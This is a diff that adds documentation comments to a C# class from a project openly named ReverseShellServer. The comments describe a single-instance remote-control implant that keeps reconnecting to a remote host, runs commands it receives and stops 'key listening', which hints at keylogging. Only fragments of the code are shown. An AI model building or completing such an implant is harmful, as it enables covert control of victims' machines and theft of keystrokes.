@@ -10,6 +10,10 @@ namespace ReverseShellServer
 {
     public class ServerManager
     {
+        /// <summary>
+        /// Constructor checks if another instance of the application is already running,
+        /// if there is one, close itself and let the already started one live
+        /// </summary>
         public ServerManager()
         {
             // Only one instance can run, random string identifier
@@ -21,6 +25,13 @@ namespace ReverseShellServer
         }
 
 
+        /// <summary>
+        /// Entry point of the server manager, indefinitely run the server method,
+        /// if the connection stops, retry after the given delay
+        /// </summary>
+        /// <param name="remoteAdress">Remote end to connect to</param>
+        /// <param name="remotePort">Remote end's port to connect to</param>
+        /// <param name="retryDelay">Time in ms to wait for between each connection attempt</param>
         public void Start(string remoteAdress, int remotePort, int retryDelay)
         {
             while (true)
@@ -31,13 +42,21 @@ namespace ReverseShellServer
         }
 
 
+        /// <summary>
+        /// Call the ServerNetworkManager ConnectToClient method, if the connection is succesfull,
+        /// start to listen for incoming commands from the client.
+        /// </summary>
+        /// <param name="remoteAdress">Remote end to connect to</param>
+        /// <param name="remotePort">Remote end's port to connect to</param>
         void RunServer(string remoteAdress, int remotePort)
         {
             if (!GlobalNetworkManager.ServerNetworkManager.ConnectToClient(remoteAdress, remotePort))
             {
+                // the connection attempt wasn't successfull
                 return;
             }
 
+            // While there is no exception, wait for incoming data and process it
             while (true)
             {
                 try
@@ -53,6 +72,10 @@ namespace ReverseShellServer
         }
 
 
+        /// <summary>
+        /// Process a string that was already processed by the client sending it, so it's a valid command
+        /// </summary>
+        /// <param name="receivedData">Data sent by the client</param>
         void ProcessCommand(string receivedData)
         {
             var splittedCommand = receivedData.Split(' ').ToList();
@@ -79,6 +102,9 @@ namespace ReverseShellServer
         }
 
 
+        /// <summary>
+        /// Close network stream and stop the key listening as well
+        /// </summary>
         void Cleanup()
         {
             try
@@ -93,6 +119,9 @@ namespace ReverseShellServer
         }
 
 
+        /// <summary>
+        /// Exit the program
+        /// </summary>
         void StopServer()
         {
             Cleanup();
